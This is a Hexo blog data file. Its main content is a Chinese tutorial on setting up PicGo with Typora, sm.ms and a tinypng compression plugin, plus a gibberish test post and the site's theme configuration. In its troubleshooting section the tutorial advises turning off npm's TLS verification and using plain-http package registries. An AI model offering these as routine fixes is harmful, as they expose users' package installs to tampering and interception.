title=\"picgo+typora+sm.ms+tinypng配置\"></a>picgo+typora+sm.ms+tinypng配置</h1><h2 id=\"引言\"><a href=\"#引言\" class=\"headerlink\" title=\"引言\"></a>引言</h2><p>由于最近感觉github图床访问速度太慢，于是换成了sm.ms感觉会好一些，但是sm.ms</p>\n<p>图床有大小限制，于是弄了个自动压缩的插件，下面是我在配置的过程中踩到的一些坑，记录了下来</p>\n<h2 id=\"typora配置\"><a href=\"#typora配置\" class=\"headerlink\" title=\"typora配置\"></a>typora配置</h2><p>在偏好设置里面配置如下</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/Uigbjv9mdVNo4Yh.png\"\n                        alt=\"image-20240514023823816\"\n                 ></p>\n<h2 id=\"picgo配置\"><a href=\"#picgo配置\" class=\"headerlink\" title=\"picgo配置\"></a>picgo配置</h2><p><strong>下载链接</strong>：<a class=\"link\"   href=\"https://github.com/PicGo\" >https://github.com/PicGo<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>在PicGo中配置服务API Token，如果你是SM.MS服务就配置SMMS的token，如果是阿里云OSS的服务就配置阿里云的token（token就是上面第2个文章标题下生成的API Token）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/5yatfZgPALFED9l.png\"\n                        alt=\"image-20240514024315478\"\n                 ></p>\n<h2 id=\"sm-ms配置\"><a href=\"#sm-ms配置\" class=\"headerlink\" title=\"sm.ms配置\"></a>sm.ms配置</h2><p>SMMS图床分海外和国内，如果海外访问不了，可以通过国内进行注册申请</p>\n<p>海外网址：<a class=\"link\"   href=\"https://link.zhihu.com/?target=https://sm.ms/\" >https://sm.ms/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>国内网址：<a class=\"link\"   href=\"https://smms.app/\" >https://smms.app/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/2QVkd9sMtrFAWEo.png\"\n                        alt=\"image-20240514024117130\"\n                 ></p>\n<p>点击Sign Up进行SMMS的账号注册</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/GZwVQWNhRPa8Eez.png\"\n                        alt=\"image-20240514024152185\"\n                 ></p>\n<h3 id=\"获取Token密钥（后面图片上传需要用）\"><a href=\"#获取Token密钥（后面图片上传需要用）\" class=\"headerlink\" title=\"获取Token密钥（后面图片上传需要用）\"></a>获取Token密钥（后面图片上传需要用）</h3><p>登录SMMS系统，找到用户信息，选择API Token，点击Generate Secret Token生成token</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1ZeRoa87Ebw6Fsp.png\"\n                        alt=\"image-20240514024251486\"\n                 ></p>\n<h2 id=\"tinypng配置\"><a href=\"#tinypng配置\" class=\"headerlink\" title=\"tinypng配置\"></a>tinypng配置</h2><p>这里要在picgo下载一个插件tinypng（<strong>这里划重点， 后面踩了很多坑，划重点！</strong>）</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/QXx4HTqvRYDPigZ.png\"\n                        alt=\"image-20240514024652599\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/vnDqBOGEuwkRiPJ.png\"\n                        alt=\"image-20240514024935584\"\n                 ></p>\n<p>将api填入设置中就行</p>\n<h2 id=\"踩坑！\"><a href=\"#踩坑！\" class=\"headerlink\" title=\"踩坑！\"></a>踩坑！</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"picgo软件可能会打不开\"><a href=\"#picgo软件可能会打不开\" class=\"headerlink\" title=\"picgo软件可能会打不开\"></a>picgo软件可能会打不开</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo xattr -d com.apple.quarantine &quot;/Applications/PicGo.app&quot;</span><br></pre></td></tr></table></figure>\n\n<p>运行即可打开</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">安装 picgo add compress</span><br><span class=\"line\"></span><br><span class=\"line\">选择使用 picgo use transformer</span><br><span class=\"line\"></span><br><span class=\"line\">参数配置 picgo config plugin compress</span><br></pre></td></tr></table></figure>\n\n<p>compress 选择压缩工具 默认选项</p>\n<ul>\n<li><a class=\"link\"   href=\"https://tinypng.com/\" >tinypng<i class=\"fas fa-external-link-alt\"></i></a> 无损压缩，需要上传到 tinypng</li>\n<li><a class=\"link\"   href=\"https://github.com/imagemin/imagemin\" >imagemin<i class=\"fas fa-external-link-alt\"></i></a> 压缩过程不需要经过网络，但是图片会有损耗</li>\n<li>image2webp 本地有损压缩，支持 GIF 格式有损压缩 注意：有些图床（比如 sm.ms）不支持 webp 图片格式，会上传失败</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/38yNpR7JSKgYd46.png\"\n                        alt=\"image-20240514025424708\"\n                 ></p>\n<h3 id=\"reason-certificate-has-expired-错误\"><a href=\"#reason-certificate-has-expired-错误\" class=\"headerlink\" title=\"reason: certificate has expired 错误\"></a><strong>reason: certificate has expired 错误</strong></h3><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://s2.loli.net/2024/05/14/1N6hdDuxUIzA8ik.png\"\n                        alt=\"image-20240514025542618\"\n                 ></p>\n<p>解决方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、取消ssl验证：</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set strict-ssl false</span><br><span class=\"line\"> </span><br><span class=\"line\">这个方法一般就可以解决了。</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">2、更换npm镜像源：</span><br><span class=\"line\"> </span><br><span class=\"line\">npm config set registry http://registry.cnpmjs.org</span><br><span class=\"line\">npm config set registry http://registry.npm.taobao.org</span><br><span class=\"line\"> </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"安装gui插件\"><a href=\"#安装gui插件\" class=\"headerlink\" title=\"安装gui插件\"></a>安装gui插件</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo -g</span><br><span class=\"line\">npm install ./picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n<p>electron版的PicGo配置文件的路径在不同的系统里是不同的：</p>\n<ul>\n<li>Windows: <code>%APPDATA%\\picgo\\data.json</code></li>\n<li>Linux: <code>$XDG_CONFIG_HOME/picgo/data.json</code> or <code>~/.config/picgo/data.json</code></li>\n<li>macOS: <code>~/Library/Application\\ Support/picgo/data.json</code></li>\n</ul>\n<p>举例，在windows里你可以在：</p>\n<p><code>C:\\Users\\你的用户名\\AppData\\Roaming\\picgo\\data.json</code>找到它。</p>\n<p>在linux里你可以在：</p>\n<p><code>~/.config/picgo/data.json</code>里找到它。</p>\n<p>macOS同理。</p>\n<p>此时你的插件目录比如在 <code>/usr/home/picgo-plugin-&lt;your-plugin-name&gt;</code>里，</p>\n<p>在PicGo默认配置文件所在的目录下，输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install /usr/home/picgo-plugin-&lt;your-plugin-name&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"插件下载失败\"><a href=\"#插件下载失败\" class=\"headerlink\" title=\"插件下载失败\"></a>插件下载失败</h3><p><strong>tingpng</strong>地址：<a class=\"link\"   href=\"https://github.com/liujinpen/picgo-plugin-compress-tinypng\" >https://github.com/liujinpen/picgo-plugin-compress-tinypng<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>开梯子没用，放弃直接安装的方式，采用npm方式安装</p>\n<p>我用的Mac，picgo路径如下： &#x2F;Users&#x2F;cunyu&#x2F;Library&#x2F;Application Support&#x2F;picgo（自己参照）</p>\n<p>解决方法： 首先，cd到这个路径下 然后Mac要安装一些插件，命令如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install libtool automake autoconf nasm</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>这个过程可能要很久，建议开梯子或有homebrew源</p>\n<p><strong>下面正式开始安装</strong></p>\n<p>第一步：清理缓存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm cache clean --force</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>第二步：删除文件夹</p>\n<p>把整个node_modules都删除</p>\n<p>第三步：install一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install picgo-plugin-compress --save --ignore-scripts --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n<p>​      </p>\n<p>第四步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>在命令行找不到目录的记得对中间的空格用反斜杠转义一下。或者打印号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd &quot;Application Support&quot;</span><br><span class=\"line\">cd Application/Support</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"dsajdlkajsklajskldsjak","source":"_posts/test111.md","raw":"dsajdlkajsklajskldsjak","slug":"test111","published":1,"date":"2024-05-15T14:24:17.900Z","updated":"2024-05-15T14:24:17.900Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"clw7wy5pd0000hw0a8c57dhkc","content":"<p>dsajdlkajsklajskldsjak</p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]},"cdn":{"enable":true,"provider":"jsdelivr"}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶狗and猫","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"excerpt":"","more":"<p>dsajdlkajsklajskldsjak</p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"cluwn76g70000oa769vu519gf","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwqzpw30001qa760vca61cc"},{"post_id":"cluwn76ge0001oa7631bpcafd","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwr1qlw0000h576a5kmel2n"},{"post_id":"cluwn76gh0002oa76f63q14je","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwr1qlz0001h576ej0y7gp4"},{"post_id":"cluwn76gj0003oa76gd3sfsek","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwr1qlz0002h576hbcx7jir"},{"post_id":"cluwn76gl0004oa76372ceptk","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwr1qm00003h5762ryi2ed6"},{"post_id":"cluwn76gn0005oa76f64pcujp","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwr1qm10004h576ht1x6jx4"},{"post_id":"cluwu323u0000we76484e0pgr","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwu32450002we76a4g3838v"},{"post_id":"cluwu32410001we76foqm4pu1","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwu32450003we76gcn07pis"},{"post_id":"cluwu73wr0002bk76fr11hbbk","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwu73ww0006bk762y2261a8"},{"post_id":"cluwu73wt0003bk76fhfuhgtj","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwu73ww0007bk761d1cbzav"},{"post_id":"cluwwqqls0000or76h8bj9jme","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"cluwwrk440000zg76hq7c756v"},{"post_id":"clv3kf7hk0000h7761sb1h8gg","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7in000ah776h515ge2n"},{"post_id":"clv3kf7ib0005h776cqcn18a7","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7iq000ch7763z4x7ct3"},{"post_id":"clv3kf7ih0007h7764viadnd7","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7iu000eh776fqegfoxg"},{"post_id":"clv3kf7hs0001h7768cbd86nu","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7iy000hh776etothr52"},{"post_id":"clv3kf7io000bh7762hqn3z20","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7j1000jh776acc20v83"},{"post_id":"clv3kf7i50003h7767sr19j3y","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7j4000mh776632h0l03"},{"post_id":"clv3kf7ir000dh776fvvd1xl7","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7j7000oh7765bh52ja3"},{"post_id":"clv3kf7iw000gh7769sksbi80","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7j9000qh776ckw86cq8"},{"post_id":"clv3kf7i90004h776638ueyi2","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jc000sh7766g1t4uoh"},{"post_id":"clv3kf7iz000ih7761ypi4rf4","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jd000uh776459ic9rw"},{"post_id":"clv3kf7j3000lh776ev30c38r","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7je000vh7768lu74hue"},{"post_id":"clv3kf7ij0008h77632qx5n8c","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jf000wh7764rwe374x"},{"post_id":"clv3kf7j5000nh7769vf383ka","category_id":"clv3kf7hx0002h776adgp8ezw","_id":"clv3kf7jf000xh77650b60g1n"},{"post_id":"clv3kf7j8000ph776dk2na505","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jf000yh7760wfwhx3c"},{"post_id":"clv3kf7ja000rh7761l7x9yqt","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jg000zh77668um6sb1"},{"post_id":"clv3kf7jc000th7763ola9iyg","category_id":"clv3kf7il0009h776agkjb96u","_id":"clv3kf7jg0010h776db0ycwf3"},{"post_id":"clvdg2y4800006y76h6yycdgn","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"clvdg2y4p00026y766vx19htt"},{"post_id":"clvdg2y4j00016y7674hwb68j","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"clvdg2y4q00036y760xrgejpy"},{"post_id":"clvfb4qr400006676f52l1nta","category_id":"clv3kf7il0009h776agkjb96u","_id":"clvfb4qrq0002667643sx01ke"},{"post_id":"clvfb4qrg000166761rxu5ykz","category_id":"clv3kf7il0009h776agkjb96u","_id":"clvfb4qrr00036676b2rg11zx"},{"post_id":"clvfbkxtj0000vm76exfu69c3","category_id":"clv3kf7il0009h776agkjb96u","_id":"clvfbkxtq0001vm766uijd81n"},{"post_id":"clvv05u7500006y7648fcbq3l","category_id":"cluwqzpvx0000qa762jf02ld5","_id":"clvv05u7f00016y769xaf5x7u"},{"post_id":"clw5c18lb00003j767dr1gvht","category_id":"clw5c18ln00013j763zcbdbrb","_id":"clw5c18m300023j762vdb4j1e"}],"PostTag":[],"Tag":[{"name":"考研","_id":"cluwqxb6b0000vu760fdb3z64"}]}}